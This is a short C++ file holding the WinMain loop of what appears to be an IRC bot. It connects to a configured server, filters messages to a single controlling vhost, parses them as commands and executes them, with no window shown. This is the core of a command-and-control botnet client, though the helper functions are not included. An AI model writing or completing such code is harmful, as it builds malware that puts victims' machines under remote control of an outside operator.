#include "Includes.h"
using namespace std;



int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
{
	
	if (irc.Connect(PORT, HOST) == true)
	{
		irc.SendFirstMessage(NICK, USER);

		for (;;)
		{
			
			irc.ReciveMsg();
			irc.isPing();
			irc.SendMsg("\r\n");
			irc.CheckvHost(VHOST);
			
			if (irc.isvhost)
			{
				irc.ParseOnlyMsg();
				if (irc.CheckCommand() == true)
				{
					irc.Execute();
				}
			}
			
				for (int i = 0; i < 256; i++)
				{
					irc.buffer[i] = '\0';
				}
		}
	}
	return 0;
}
